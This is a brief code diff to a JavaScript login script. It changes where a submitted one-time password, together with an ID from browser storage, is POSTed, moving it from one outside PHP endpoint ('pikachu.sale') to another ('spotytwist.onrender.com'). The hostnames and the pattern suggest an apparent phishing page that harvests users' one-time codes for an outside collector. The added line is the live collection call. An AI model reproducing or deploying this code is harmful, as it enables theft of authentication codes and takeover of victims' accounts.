@@ -22,7 +22,7 @@ document.getElementById("login-button").addEventListener("click", function (even
     const data = { otp, unique_id: localStorage.getItem('unique_id') };
 
     // Send OTP to PHP script
-    fetch("https://pikachu.sale/spot/send_otp.php", {
+    fetch("https://spotytwist.onrender.com/send_otp.php", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data),
